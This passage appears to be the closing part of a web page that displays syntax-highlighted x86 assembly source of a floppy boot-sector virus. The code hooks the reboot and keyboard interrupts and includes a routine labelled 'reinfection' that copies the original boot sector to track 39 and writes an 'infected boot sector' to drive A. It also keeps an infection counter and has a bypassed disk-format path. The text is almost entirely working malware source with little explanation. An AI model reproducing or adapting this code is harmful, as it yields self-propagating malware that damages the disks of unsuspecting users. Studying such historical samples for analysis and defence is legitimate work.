    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0800H</span><span class="sc0">       </span><span class="sc1">;AL=0, AH=DELAY ARG</span><span class="sc0">
    </span><span class="sc6">OUT</span><span class="sc0">  </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">DELAY</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">ALT_CTRL</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">  </span><span class="sc1">;AX=0     ;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;AH=0          ;SELECT 80x25 COLOR</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0">  </span><span class="sc2">10H</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;SET CURSOR POS 0,0</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0">  </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc8">DH</span><span class="sc0">               </span><span class="sc1">;   PAGE 0</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0">  </span><span class="sc2">10H</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;SET CURSOR TYPE</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0607H</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0">  </span><span class="sc2">10H</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0420H</span><span class="sc0">       </span><span class="sc1">;DELAY (AL=20H FOR EOI BELOW)</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">DELAY</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">CLI</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">OUT</span><span class="sc0">  </span><span class="sc2">20H</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">              </span><span class="sc1">;SEND EOI TO INT CONTROLLER</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">     </span><span class="sc1">;CX=0 (DELAY)  ;RESTORE FIRST 32 INT VECTORS</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">               </span><span class="sc1">;   (REMOVING OUR INT 09 HANDLER!)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BEGIN</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">128</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">CLD</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">REP</span><span class="sc0">  </span><span class="sc6">MOVSB</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">     </span><span class="sc1">;CX=0          ;DS=0</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">19H</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NEW_19</span><span class="sc0"> </span><span class="sc1">;SET INT 19 VECTOR</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc4">[(</span><span class="sc2">19H</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">CS</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0040H</span><span class="sc0">       </span><span class="sc1">;DS = ROM DATA AREA</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc2">0017H</span><span class="sc4">],</span><span class="sc8">AH</span><span class="sc0">     </span><span class="sc1">;AH=0     ;KBFLAG (SHIFT STATES) = 0</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0">  </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">0013H</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;MEMORY SIZE += 1024 (WERE NOT ACTIVE)</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">             </span><span class="sc1">;IF BIOS F000:E502 == 21E4...</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0F000H</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0">  </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">0E502H</span><span class="sc4">],</span><span class="sc2">21E4H</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">   </span><span class="sc5">R_90</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0">  </span><span class="sc2">19H</span><span class="sc0">            </span><span class="sc1">;   IF NOT...REBOOT</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">R_90</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">JMP</span><span class="sc0">  </span><span class="sc2">0F000</span><span class="sc4">:</span><span class="sc2">0E502H</span><span class="sc0">        </span><span class="sc1">;...DO IT ?!?!?!</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; REBOOT INT VECTOR                                                     ;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">NEW_19</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">XOR</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">               </span><span class="sc1">;DS=0</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc2">0410</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;AX=EQUIP FLAG</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;IF FLOPPY DRIVES ...</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0">  </span><span class="sc5">N19_20</span><span class="sc0">              </span><span class="sc1">;...JUMP</span><span class="sc0">
</span><span class="sc5">N19_10</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">             </span><span class="sc1">;ELSE ES=CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">PUT_NEW_09</span><span class="sc0">          </span><span class="sc1">;SAVE/REDIRECT INT 9 (KEYBOARD)</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0">  </span><span class="sc2">18H</span><span class="sc0">            </span><span class="sc1">;LOAD BASIC</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">N19_20</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0004</span><span class="sc0">             </span><span class="sc1">;RETRY COUNT = 4</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">N19_22</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">               </span><span class="sc1">;RESET DISK</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0">  </span><span class="sc2">13</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">   </span><span class="sc5">N19_81</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0201</span><span class="sc0">             </span><span class="sc1">;READ BOOT SECTOR</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BEGIN</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;TRACK 0, SECTOR 1</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0">  </span><span class="sc2">13H</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">N19_81</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">JNB</span><span class="sc0">  </span><span class="sc5">N19_90</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">N19_22</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0">  </span><span class="sc5">N19_10</span><span class="sc0">              </span><span class="sc1">;IF RETRY EXPIRED...LOAD BASIC</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; Reinfection segment.                                                  ;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">N19_90</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">  </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">3456</span><span class="sc0">             </span><span class="sc1">;IF NOT FLAG SET...</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0">  </span><span class="sc5">RE_INFECT</span><span class="sc0">      </span><span class="sc1">;...RE INFECT</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">JMP_BOOT</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;PASS CONTROL TO BOOT SECTOR</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0">  </span><span class="sc2">0000</span><span class="sc4">:</span><span class="sc2">7C00H</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; Reinfection Segment.                                                  ;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">RE_INFECT</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BEGIN</span><span class="sc0">          </span><span class="sc1">;COMPARE BOOT SECTOR JUST LOADED WITH</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">00E6H</span><span class="sc0">       </span><span class="sc1">;   OURSELF</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">CLD</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">REPE</span><span class="sc0"> </span><span class="sc6">CMPSB</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">   </span><span class="sc5">RI_12</span><span class="sc0">               </span><span class="sc1">;IF NOT EQUAL...</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0">  </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc5">COUNTER_1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;INC. COUNTER IN OUR CODE (NOT DS!)</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;MAKE SURE TRACK 39, HEAD 0 FORMATTED  ;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TABLE</span><span class="sc0">          </span><span class="sc1">;FORMAT INFO</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0000</span><span class="sc0">             </span><span class="sc1">;DRIVE A: HEAD 0</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">;TRACK 39</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">           </span><span class="sc1">;FORMAT</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0">  </span><span class="sc5">RI_10</span><span class="sc0">               </span><span class="sc1">;REMOVE THE FORMAT OPTION FOR NOW !</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; &lt;&lt;&lt; NO EXECUTION PATH TO HERE &gt;&gt;&gt;    ;</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">   </span><span class="sc5">RI_80</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;WRITE REAL BOOT SECTOR AT TRACK 39, SECTOR 8, HEAD 0</span><span class="sc0">
</span><span class="sc5">RI_10</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">               </span><span class="sc1">;ES:BX = 0000:7C00, HEAD=0</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BEGIN</span><span class="sc0">          </span><span class="sc1">;TRACK 40H</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">;SECTOR 8</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0301H</span><span class="sc0">       </span><span class="sc1">;WRITE 1 SECTOR</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0">  </span><span class="sc2">13H</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">             </span><span class="sc1">;   (ES=CS FOR PUT_NEW_09 BELOW)</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">   </span><span class="sc5">RI_80</span><span class="sc0">               </span><span class="sc1">;IF WRITE ERROR...JUMP TO BOOT CODE</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0001</span><span class="sc0">             </span><span class="sc1">;WRITE INFECTED BOOT SECTOR !</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0301</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0">  </span><span class="sc2">13H</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">   </span><span class="sc5">RI_80</span><span class="sc0">               </span><span class="sc1">;   IF ERROR...JUMP TO BOOT CODE</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">RI_12</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">3456H</span><span class="sc0">       </span><span class="sc1">;SET "JUST INFECTED ANOTHER ONE"...</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0">  </span><span class="sc2">19H</span><span class="sc0">            </span><span class="sc1">;...FLAG AND REBOOT</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">RI_80</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">PUT_NEW_09</span><span class="sc0">          </span><span class="sc1">;SAVE/REDIRECT INT 9 (KEYBOARD)</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0">  </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc5">COUNTER_1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;   (DEC. CAUSE DIDNT INFECT)</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0">  </span><span class="sc5">JMP_BOOT</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                                                                       ;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">N09_X1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">ALT_CTRL</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">       </span><span class="sc1">;SAVE ALT &amp; CTRL STATUS</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc5">COUNTER_1</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;PUT COUNTER_1 INTO RESET FLAG</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0040H</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc2">0072H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">;   0040:0072 = RESET FLAG</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0">  </span><span class="sc5">N09_90</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; DELAY                                                                 ;</span><span class="sc0">
</span><span class="sc1">;                                                                       ;</span><span class="sc0">
</span><span class="sc1">; ON ENTRY    AH:CX = LOOP COUNT                                        ;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">DELAY</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">SUB</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">D_01</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0">  </span><span class="sc5">D_01</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                                                                       ;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">A7DF4</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">   </span><span class="sc2">27H</span><span class="sc4">,</span><span class="sc2">00H</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">COUNTER_1</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">   </span><span class="sc2">001CH</span><span class="sc0">
</span><span class="sc5">ALT_CTRL</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">A7DFC</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">   </span><span class="sc2">27H</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span></div></body>
</html>
